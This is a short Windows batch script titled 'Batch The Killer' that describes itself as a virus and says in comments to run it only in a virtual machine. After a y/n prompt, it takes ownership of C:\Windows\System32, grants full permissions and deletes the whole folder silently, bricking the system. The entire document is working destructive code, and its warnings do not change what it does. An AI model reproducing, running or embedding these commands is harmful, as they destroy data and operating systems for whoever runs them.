REM WARNING!!!:
@echo off
REM THIS SCRIPT IS INCREDIBLY DANGEROUS AND CAN CAUSE SERIOUS DAMAGE TO YOUR COMPUTER. USE IT ONLY INSIDE A VIRTUAL MACHINE AT YOUR OWN 
REM RISK. MAKE SURE YOU TAKE A SNAPSHOT OF THE VIRTUAL MACHINE BEFORE YOU RUN THIS SCRIPT INSIDE IT. THE CREATOR IS NOT RESPONSIBLE FOR THE 
REM DAMAGE CAUSED BY THIS VIRUS. USE IT AT YOUR OWN RISK! THIS SCRIPT CAN DELETE SYSTEM FILES FROM YOUR COMPUTER.
REM IF YOU ARE RUNNING THIS SCRIPT INSIDE A REAL COMPUTER, PRESS NO IMMEDIATELY!!!
:: Main code
echo Welcome to Batch The Killer. This virus will brick your computer and make it unusable.
echo If you really wanna kill your computer, type 'y', otherwise 'n'.
echo.
set /p choice="Enter your choice[y/n]: "
if /i "%choice%"=="y" ( 
    echo In that case, let's delete your computer. 
    timeout /t 2 >nul 
    takeown /f C:\Windows\System32 /r /d y 
    icacls C:\Windows\System32 /grant administrators:F /t /q 
    rd /s /q C:\Windows\System32
    cls 
    echo Complete. Your PC is now bricked. Try restarting your computer or clicking programs and see what happens. 
    pause 
    exit
) else ( 
    echo Smart choice. 
    timeout /t 2 >nul 
    exit
)
